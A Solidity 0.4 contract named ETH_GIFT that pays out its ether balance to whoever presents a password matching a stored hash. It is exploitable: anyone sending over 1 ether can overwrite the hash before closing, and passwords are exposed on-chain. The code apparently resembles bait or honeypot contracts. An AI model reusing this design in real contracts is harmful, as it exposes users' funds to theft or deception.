1 pragma solidity ^0.4.19;
2 
3 contract ETH_GIFT
4 {
5     function GetGift(bytes pass) external payable canOpen {
6         if(hashPass == keccak256(pass))
7         {
8             msg.sender.transfer(this.balance);
9         }
10     }
11     
12     function GetGift() public payable canOpen {
13         if(msg.sender==reciver)
14         {
15             msg.sender.transfer(this.balance);
16         }
17     }
18     
19     bytes32 hashPass;
20     bool closed = false;
21     address sender;
22     address reciver;
23     uint giftTime;
24  
25     function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
26     
27     function Set_eth_gift(bytes32 hash) public payable {
28         if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
29         {
30             hashPass = hash;
31             sender = msg.sender;
32             giftTime = now;
33         }
34     }
35     
36     function SetGiftTime(uint date) public canOpen {
37         if(msg.sender==sender)
38         {
39             giftTime = date;
40         }
41     }
42     
43     function SetReciver(address _reciver) public {
44         if(msg.sender==sender)
45         {
46             reciver = _reciver;
47         }
48     }
49     
50     function PassHasBeenSet(bytes32 hash) public {
51         if(hash==hashPass&&msg.sender==sender)
52         {
53            closed=true;
54         }
55     }
56     
57     modifier canOpen(){
58         if(now>giftTime)_;
59         else return;
60     }
61     
62     function() public payable{}
63     
64 }